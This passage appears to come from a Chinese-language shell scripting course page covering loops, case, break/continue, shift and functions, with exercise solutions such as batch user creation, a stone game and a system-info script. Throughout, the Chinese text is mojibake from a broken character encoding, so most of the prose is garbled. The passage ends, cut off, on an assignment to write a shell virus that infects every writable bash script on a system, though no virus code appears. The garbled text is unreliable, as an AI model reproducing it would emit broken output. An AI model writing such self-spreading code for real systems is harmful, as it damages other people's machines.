å­—ç¬¦çš„åˆ¤æ–­ æ–‡ä»¶çš„åˆ¤æ–­</span><br><span class="line">-gt å¤§äº -z ç©º -d æ–‡ä»¶æ˜¯ä¸æ˜¯ä¸€ä¸ªç›®å½•</span><br><span class="line">-ge å¤§äºç­‰äº =  å­—ç¬¦ç›¸ç­‰ -f æ˜¯ä¸æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶</span><br><span class="line">-lt å°äº != å­—ç¬¦ä¸ç›¸ç­‰ -e æ–‡ä»¶æ˜¯ä¸æ˜¯å­˜åœ¨</span><br><span class="line">-le å°äºç­‰äº -n éç©º </span><br><span class="line">-ne ä¸ç­‰äº -a é€»è¾‘ä¸</span><br><span class="line">-eq ç­‰äº -o é€»è¾‘æˆ–</span><br></pre></td></tr></table></figure><ol><li>å½“ä»€ä¹ˆçš„æ—¶å€™å°±åšä»€ä¹ˆ,ä½“éªŒæ— é™å¾ªç¯<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">å½“å±±å³°æ²¡æœ‰æ£±è§’çš„æ—¶å€™</span><br><span class="line">å½“æ²³æ°´ä¸å†æµ</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">æˆ‘å“ˆå“ˆishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li>ä¸æ»¡è¶³æ¡ä»¶è·³å‡ºå¾ªç¯<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åˆ¤æ–­/tmp/whilefile2æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨çš„æ—¶å€™æˆ‘ä»¬å»åˆ›å»º</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li></ol><h3 id="until-è¯­æ³•æ ¼å¼"><a href="#until-è¯­æ³•æ ¼å¼" class="headerlink" title="until è¯­æ³•æ ¼å¼"></a>until è¯­æ³•æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until condition --&gt; ä¸æ»¡è¶³ condition, åˆ™æ‰§è¡Œ cmd</span><br><span class="line">do</span><br><span class="line">CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ -2"><a href="#è¯¾å ‚ç»ƒä¹ -2" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><pre><code>1. è¿ä¹˜ç®—æ³• whileå’Œuntil2. è¦æ±‚æ ¹æ®userliståˆ›å»ºç”¨æˆ·ï¼Œè¦æ±‚æŒ‡å®šç”¨æˆ·åï¼Œç”¨æˆ·idï¼Œç”¨æˆ·çš„é™„åŠ ç»„åŠå˜æ›´ç”¨æˆ·uå¯†ç ï¼Œè‹¥å¯¹åº”ç”¨æˆ·çš„é™„åŠ ç»„ä¸å­˜åœ¨ï¼Œåˆ™å°†é™„åŠ ç»„åˆ›å»ºå‡ºæ¥åå†æ ¹æ®è¦æ±‚æ·»åŠ ç”¨æˆ·ã€‚userlistæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼šcarol 777 tom uplookingnatasha 778 tom uplookingr1 779 tom uplooking3. è¦æ±‚æ ¹æ®userliståˆ›å»ºç”¨æˆ·ï¼Œè¦æ±‚æŒ‡å®šç”¨æˆ·åï¼Œç”¨æˆ·idï¼Œç”¨æˆ·çš„é»˜è®¤ç»„å’Œé™„åŠ ç»„åŠå˜æ›´ç”¨æˆ·uå¯†ç ï¼Œè‹¥å¯¹åº”ç”¨æˆ·çš„é™„åŠ ç»„ä¸å­˜åœ¨ï¼Œåˆ™å°†é™„åŠ ç»„åˆ›å»ºå‡ºæ¥åå†æ ¹æ®è¦æ±‚æ·»åŠ ç”¨æˆ·ã€‚[root@rhel6 ~]# cat /tmp/useraddlist1dabao 888 xuexi,it uplookinglucy 889 sales,it uplookinglily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">A=(<span class="variable">$a</span>)</span><br><span class="line">groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure><h3 id="æ™šè‡ªä¹ ä½œä¸š"><a href="#æ™šè‡ªä¹ ä½œä¸š" class="headerlink" title="æ™šè‡ªä¹ ä½œä¸š"></a>æ™šè‡ªä¹ ä½œä¸š</h3><ol><li>å®Œæˆä»Šå¤©è¯¾ä¸Šçš„æ‰€æœ‰ç»ƒä¹ é¢˜ç›®</li><li>çŸ³å­æ¸¸æˆï¼šæœ‰nçŸ³å­ï¼Œè°æ‹¿åˆ°æœ€åä¸€ä¸ªçŸ³å­è°èµ¢ï¼Œ<br>ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸€å…±ç”±å¤šå°‘ä¸ªçŸ³å­ï¼Œæ¯æ¬¡æœ€å¤šå¯ä»¥æ‹¿çš„çŸ³å­æ•°æ˜¯å¯ä»¥ç»™ç”¨æˆ·æŒ‡å®šçš„</li><li>åˆ›å»ºä¸€ä¸ªä»¥ä»Šå¤©æ—¥æœŸä¸ºåçš„ç›®å½•20160811;<br>å°†/ç›®å½•ä¸‹æ‰€æœ‰ä»¥.shç»“å°¾çš„æ–‡ä»¶å¤åˆ¶åˆ°æ–°åˆ›å»ºçš„ç›®å½•ä¸­ï¼›<br>å°†è¯¥ç›®å½•æ‰“åŒ…å‹ç¼©å­˜åˆ°/tmpç›®å½•ä¸‹ä¿å­˜ã€‚</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"æ¸¸æˆå¼€å§‹ï¼è¯·ç©å®¶æŒ‡å®šçŸ³å­çš„ä¸ªæ•°:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"è¯·ç©å®¶æŒ‡å®šæ¯æ¬¡å–çŸ³å­çš„æœ€å¤šä¸ªæ•°:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+1)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"è¯·ç©å®¶å–çŸ³å­:"</span> w</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"æˆ‘å– <span class="variable">$((($n2+1)</span>-<span class="variable">$w</span>)) ä¸ªçŸ³å­"</span></span><br><span class="line">q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+1)))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ç›®å‰è¿˜å‰©ä¸‹ <span class="variable">$q</span> ä¸ªçŸ³å­"</span></span><br><span class="line">[ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"ä½ è¾“äº†@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"æˆ‘å…ˆå– <span class="variable">$k</span> ä¸ªçŸ³å­"</span></span><br><span class="line">q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ç›®å‰è¿˜å‰©ä¸‹ <span class="variable">$q</span> ä¸ªçŸ³å­"</span></span><br><span class="line">HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">q=<span class="variable">$n1</span></span><br><span class="line">HH</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="case-è¯­æ³•æ ¼å¼"><a href="#case-è¯­æ³•æ ¼å¼" class="headerlink" title="case è¯­æ³•æ ¼å¼"></a>case è¯­æ³•æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case å–å€¼ in</span><br><span class="line">å–å€¼ 1)</span><br><span class="line">CMD1 ;</span><br><span class="line">cmd11;</span><br><span class="line">cmd12;;</span><br><span class="line">å–å€¼ 2)</span><br><span class="line">CMD2 ;;</span><br><span class="line">å–å€¼ 3)</span><br><span class="line">CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>* ä»£è¡¨é™¤äº†ä»¥ä¸Šæ‰€æœ‰çš„å–å€¼ , åšæŸä¸€äº›æ“ä½œ</p><h4 id="è¯¾å ‚ç»ƒä¹ -3"><a href="#è¯¾å ‚ç»ƒä¹ -3" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol><li>è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ å¦‚æœä½ å›ç­”yesï¼Œåˆ™ç¨‹åºé€€å‡ºï¼Œå¦åˆ™æ°¸è¿œä¼šé—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">exit;;</span><br><span class="line">*)</span><br><span class="line">read -p "è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿyes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿno</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿlsdjflksd</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿlsdjflksd</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿiii</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿfuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ...</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿ^^^[[D</span><br><span class="line">è¯·é—®ä½ æ˜¯å¦å–œæ¬¢shellè„šæœ¬ï¼Ÿyes</span><br></pre></td></tr></table></figure><h3 id="continue-è¯­æ³•æ ¼å¼"><a href="#continue-è¯­æ³•æ ¼å¼" class="headerlink" title="continue è¯­æ³•æ ¼å¼"></a>continue è¯­æ³•æ ¼å¼</h3><pre><code>continue ä½œç”¨äºå¾ªç¯è¯­å¥ä¸­ ä»£è¡¨è·³å‡ºè¿™ä¸ªå¾ªç¯è¿›å…¥ä¸‹ä¸ªå¾ªç¯ .</code></pre><h4 id="è¯¾å ‚ç»ƒä¹ -4"><a href="#è¯¾å ‚ç»ƒä¹ -4" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol start="2"><li>è¦æ±‚è¾“å‡º100ä»¥ä¸‹æ‰€æœ‰èƒ½å¤Ÿè¢«7æ•´é™¤ï¼Œä½†ä¸èƒ½å¤Ÿè¢«5æ•´é™¤çš„æ•°å­—ã€‚ï¼ˆå¹¶åœ¨ä¸€è¡Œè¾“å‡ºï¼‰</li></ol><h3 id="break-è¯­æ³•æ ¼å¼"><a href="#break-è¯­æ³•æ ¼å¼" class="headerlink" title="break è¯­æ³•æ ¼å¼"></a>break è¯­æ³•æ ¼å¼</h3><pre><code>break ä½œç”¨äºå¾ªç¯è¯­å¥ä¸­ ä»£è¡¨ç›´æ¥è·³å‡ºè¯¥å¾ªç¯ .</code></pre><h4 id="è¯¾å ‚ç»ƒä¹ -5"><a href="#è¯¾å ‚ç»ƒä¹ -5" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol start="3"><li>è¦æ±‚æ‰¾å‡ºç³»ç»Ÿä¸­å±äºstudentç”¨æˆ·çš„ä¸€ä¸ªæ–‡ä»¶.</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="shift-è¯­æ³•æ ¼å¼"><a href="#shift-è¯­æ³•æ ¼å¼" class="headerlink" title="shift è¯­æ³•æ ¼å¼"></a>shift è¯­æ³•æ ¼å¼</h3><pre><code>ä½ç½®å‚æ•°</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 ä»£è¡¨çš„æ˜¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 ä»£è¡¨çš„æ˜¯è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•° ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 ä»£è¡¨çš„æ˜¯ bash ç¨‹åºæœ¬èº«å</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># ä»£è¡¨çš„æ˜¯å‚æ•°çš„ä¸ªæ•°</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; è¶…è¿‡çš„ä¸¤ä½çš„</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;æˆ–è€…<span class="variable">$&#123;@&#125;</span> ä»£è¡¨å°†æ‰€æœ‰ä½ç½®å‚æ•°</span></span><br><span class="line">shift ä»£è¡¨ç§»èµ°ç¬¬ä¸€ä½ä½ç½®å‚æ•° , ç”±åç»­çš„ä½ç½®å‚æ•°å‰ç§»ä¸€ä½ .</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ -6"><a href="#è¯¾å ‚ç»ƒä¹ -6" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol start="4"><li>æ˜¾ç¤ºä½ç½®å‚æ•°çš„å€¼ï¼Œä»¥åŠå¯æ‰§è¡Œè„šæœ¬åç§°ï¼Œå‚æ•°çš„æ€»æ•°</li></ol><h3 id="function-è¯­æ³•æ ¼å¼"><a href="#function-è¯­æ³•æ ¼å¼" class="headerlink" title="function è¯­æ³•æ ¼å¼"></a>function è¯­æ³•æ ¼å¼</h3><pre><code>functname (){shell commands}</code></pre><ul><li><p>å‡½æ•°çš„è°ƒç”¨</p><ol><li>ç›´æ¥è°ƒç”¨å‡½æ•°â€“ å‡½æ•°å</li><li>ä¼ å…¥å‚æ•°â€“ å‡½æ•°å å‚æ•°1 å‚æ•°2 å‚æ•°3</li><li>ä½¿ç”¨returnè¿”å›å‡½æ•°ç»“æŸçŠ¶æ€</li></ol></li><li><p>å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡</p></li></ul><p>é»˜è®¤ä¸ºå…¨å±€å˜é‡ï¼Œå› æ­¤ä¸åŒçš„å‡½æ•°ä¸å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªå˜é‡ï¼›<br>å¦‚æœè¦å˜æˆå±€éƒ¨å˜é‡ï¼Œéœ€è¦ä½¿ç”¨localæ¥ä¿®é¥°ï¼Œé‚£ä¹ˆä¸åŒçš„å‡½æ•°å°±ä¸èƒ½è®¿é—®åˆ°è¿™ä¸ªå±€éƒ¨å˜é‡ã€‚</p><ul><li>å‡½æ•°è¿”å›å€¼ return<br>å¯ä»¥ä½¿ç”¨returnå‘½ä»¤æ¥è®¾ç½®è¿”å›å€¼ï¼›</li></ul><p>ä¾‹å¦‚ return 0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#### è¯¾å ‚ç»ƒä¹ </span></span><br><span class="line"></span><br><span class="line">5. åˆ›å»ºä¸€ä¸ªå‘½ä»¤boobooï¼Œå‘½ä»¤ç”¨æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">booboo -t 30s ä»£è¡¨ç¡30sï¼›å³-tåè·Ÿæ—¶é—´</span><br><span class="line">booboo -l /tmp  ä»£è¡¨æ˜¾ç¤ºæŸä¸ªç›®å½•ä¸‹é¢çš„å†…å®¹å’Œå±æ€§ä»¥åŠç›®å½•æœ¬èº«çš„å±æ€§</span><br><span class="line">booboo -r /tmp/file ä»£è¡¨åˆ é™¤æŸä¸ªæ–‡ä»¶</span><br><span class="line">booboo --<span class="built_in">help</span>ä»£è¡¨å¸®åŠ©ä¿¡æ¯æ˜¾ç¤ºè¯¥å‘½ä»¤çš„ç”¨æ³•</span><br><span class="line"></span><br><span class="line">6. è¾“å…¥ä½ çš„å‡ºç”Ÿæ—¥æœŸï¼Œç¨‹åºä¼šå‘Šè¯‰ä½ è·ç¦»ä½ ä¸‹ä¸€ä¸ªç”Ÿæ—¥è¿˜æœ‰å‡ å¤©ï¼Ÿ</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">ls -l <span class="variable">$1</span></span><br><span class="line">ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure><hr><p>ä½¿ç”¨bashå†™ä¸€ä¸ªè„šæœ¬å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p><p>1) -r æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬<br>2) -k æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬<br>3) -d æŸ¥çœ‹ç³»ç»Ÿç£ç›˜ä¿¡æ¯<br>4) -u æŸ¥çœ‹å½“å‰ç³»ç»Ÿç”¨æˆ·<br>5) -t æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œæ—¶é—´<br>6) -s æŸ¥çœ‹selinuxçŠ¶æ€<br>7) -f æŸ¥çœ‹å†…å­˜ä¿¡æ¯<br>8) -n æŸ¥çœ‹ç½‘ç»œä¿¡æ¯<br>9) -a å®ç°ä»¥ä¸Šæ‰€æœ‰åŠŸèƒ½<br>10ï¼‰â€“help æŸ¥çœ‹å¸®åŠ©</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">REL;;</span><br><span class="line">-k)</span><br><span class="line">KER;;</span><br><span class="line">-d)</span><br><span class="line">DIS;;</span><br><span class="line">-u)</span><br><span class="line">USR;;</span><br><span class="line">-t)</span><br><span class="line">UPT;;</span><br><span class="line">-s)</span><br><span class="line">SEL;;</span><br><span class="line">-f)</span><br><span class="line">FER;;</span><br><span class="line">-n)</span><br><span class="line">NET;;</span><br><span class="line">-a)</span><br><span class="line">REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><hr><p>ç”¨shellè„šæœ¬å†™ä¸€ä¸ªç—…æ¯’ï¼Œè¦æ±‚å¦‚ä¸‹ï¼š</p><ol><li>å¯ä»¥æ„ŸæŸ“ç³»ç»Ÿä¸­çš„æ‰€æœ‰Bourne-Again shell scriptçš„è„šæœ¬,å¯æ‰§è¡Œï¼Œå¯å†™ï¼›</li><li>æ‰§è¡Œæ„ŸæŸ“åçš„bash shellè„šæœ¬ä¼šè¾“å‡ºâ€echo hello,I am 